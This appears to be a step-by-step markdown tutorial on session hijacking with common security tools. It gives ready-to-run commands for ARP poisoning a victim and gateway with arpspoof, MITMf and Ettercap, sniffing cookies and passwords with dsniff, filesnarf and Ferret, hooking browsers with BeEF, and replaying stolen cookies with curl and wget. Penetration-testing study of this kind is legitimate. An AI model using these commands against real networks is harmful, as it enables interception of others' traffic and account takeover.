# Session Hijacking Tools and Techniques

This document provides detailed information on various tools and techniques used for session hijacking. Each tool is explained step-by-step for practical implementation.

---

## 1. Wireshark

### **Purpose:**
Wireshark is used for network traffic sniffing and packet analysis. It can help identify cookies, HTTP sessions, or other sensitive data.

### **Steps to Use:**
1. **Install Wireshark:**
   ```bash
   sudo apt update
   sudo apt install wireshark
   ```

2. **Run Wireshark:**
   ```bash
   wireshark
   ```

3. **Select Network Interface:**
   - Choose the network interface (e.g., `eth0` or `wlan0`) where the traffic is flowing.

4. **Filter Traffic:**
   - To filter for HTTP cookies:
     ```plaintext
     http.cookie
     ```
   - To find HTTP requests or responses:
     ```plaintext
     http.request or http.response
     ```

5. **Analyze Packets:**
   - Double-click on captured packets to examine their details.
   - Look for cookie values in the HTTP headers.

6. **Save Captured Packets:**
   ```bash
   File > Save As > [filename].pcap
   ```

---

## 2. tcpdump

### **Purpose:**
`tcpdump` is a command-line tool for capturing network traffic.

### **Steps to Use:**
1. **Install tcpdump:**
   ```bash
   sudo apt update
   sudo apt install tcpdump
   ```

2. **Capture Traffic on an Interface:**
   ```bash
   sudo tcpdump -i eth0
   ```

3. **Filter HTTP Traffic:**
   ```bash
   sudo tcpdump -i eth0 port 80
   ```

4. **Save Packets to a File:**
   ```bash
   sudo tcpdump -i eth0 -w traffic.pcap
   ```

5. **Analyze Captured Packets:**
   Open the `pcap` file in Wireshark for detailed analysis:
   ```bash
   wireshark traffic.pcap
   ```

---

## 3. Ettercap

### **Purpose:**
Ettercap is a tool for Man-in-the-Middle (MITM) attacks, enabling sniffing and hijacking of sessions.

### **Steps to Use:**
1. **Install Ettercap:**
   ```bash
   sudo apt update
   sudo apt install ettercap-graphical
   ```

2. **Run Ettercap:**
   ```bash
   sudo ettercap -G
   ```

3. **Setup:**
   - Select the network interface:
     ```plaintext
     Sniff > Unified Sniffing
     ```
   - Scan for hosts:
     ```plaintext
     Hosts > Scan for Hosts
     ```
   - Add targets (victim and gateway):
     ```plaintext
     Hosts > Add to Target 1 / Add to Target 2
     ```

4. **Enable ARP Poisoning:**
   ```plaintext
   Mitm > ARP Poisoning > Sniff Remote Connections
   ```

5. **Monitor Traffic:**
   - View and analyze traffic in real-time.

---

## 4. dsniff

### **Purpose:**
`dsniff` is a set of tools to extract sensitive information like cookies or passwords from network traffic.

### **Steps to Use:**
1. **Install dsniff:**
   ```bash
   sudo apt update
   sudo apt install dsniff
   ```

2. **Run dsniff:**
   ```bash
   sudo dsniff -i eth0
   ```

3. **Useful Commands:**
   - ARP Spoofing:
     ```bash
     sudo arpspoof -i eth0 -t [victim_ip] [gateway_ip]
     ```
   - File Sniffing:
     ```bash
     sudo filesnarf -i eth0
     ```

---

## 5. Burp Suite

### **Purpose:**
Burp Suite is a comprehensive tool for intercepting and modifying HTTP requests and responses.

### **Steps to Use:**
1. **Install Burp Suite:**
   ```bash
   sudo apt update
   sudo apt install burpsuite
   ```

2. **Set Up Proxy:**
   - Run Burp Suite:
     ```bash
     burpsuite
     ```
   - Configure your browser to use Burp as a proxy (default port: 8080).

3. **Intercept and Hijack Sessions:**
   - Enable interception in `Proxy > Intercept`.
   - Capture HTTP requests and modify cookie headers to hijack sessions.

---

## 6. Hunt

### **Purpose:**
Hunt is used to identify and hijack active network sessions.

### **Steps to Use:**
1. **Install Hunt:**
   ```bash
   sudo apt update
   sudo apt install hunt
   ```

2. **Run Hunt:**
   ```bash
   sudo hunt
   ```

3. **Monitor and Hijack:**
   - Identify active sessions.
   - Use the tool's options to hijack or terminate sessions.

---

## 7. Hamster and Ferret

### **Purpose:**
These tools are used to sniff and replay cookies for session hijacking.

### **Steps to Use:**
1. **Install Hamster and Ferret:**
   ```bash
   sudo apt install hamster ferret
   ```

2. **Capture Traffic with Ferret:**
   ```bash
   sudo ferret -i eth0
   ```

3. **Replay Traffic with Hamster:**
   ```bash
   hamster
   ```
   - Set your browser to use Hamster as a proxy.

---

## 8. MITMf

### **Purpose:**
MITMf (Man-in-the-Middle Framework) is used for traffic manipulation and session hijacking.

### **Steps to Use:**
1. **Install MITMf:**
   ```bash
   sudo apt install mitmf
   ```

2. **Perform ARP Spoofing:**
   ```bash
   mitmf --arp --spoof --gateway [gateway_ip] --target [victim_ip]
   ```

3. **Monitor and Inject Traffic:**
   - Use plugins or additional options to manipulate traffic.

---

## 9. BeEF

### **Purpose:**
BeEF (Browser Exploitation Framework) is used to exploit browsers and hijack sessions.

### **Steps to Use:**
1. **Install BeEF:**
   ```bash
   sudo apt install beef-xss
   ```

2. **Start BeEF:**
   ```bash
   beef-xss
   ```

3. **Exploit Browsers:**
   - Use the web interface to control hooked browsers and hijack sessions.

---

## 10. Cookie Analysis and Usage

### **cURL:**
Send requests with stolen cookies:
```bash
curl -b "session_id=value" http://target.com
```

### **Wget:**
Use cookies in HTTP requests:
```bash
wget --header="Cookie: session_id=value" http://target.com
```

---

**Disclaimer:** This document is intended for educational purposes and authorized testing only. Unauthorized use of these tools may violate laws and regulations.

---
